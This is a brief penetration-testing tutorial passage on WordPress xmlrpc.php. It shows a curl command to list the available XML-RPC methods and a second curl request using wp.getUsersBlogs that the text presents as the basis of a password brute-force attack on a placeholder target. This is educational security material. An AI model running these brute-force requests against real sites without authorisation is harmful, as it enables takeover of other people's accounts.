It is important to note that `xmlrpc.php` being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, `xmlrpc.php` can facilitate some enumeration and exploitation activities, though.

Identifying if `xmlrpc.php` is enabled is as easy as requesting `xmlrpc.php` on the domain we are assessing.

Identifying the correct method to call is easy utilize `system.listMethods` as follows:
```bash
curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://target-wordpress.com/xmlrpc.php
```
More can be found in this [documentation](https://codex.wordpress.org/XML-RPC/system.listMethods).

We can also mount a password brute-forcing attack through `xmlrpc.php`, as follows:
```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://target-wordpress.com/xmlrpc.php 
```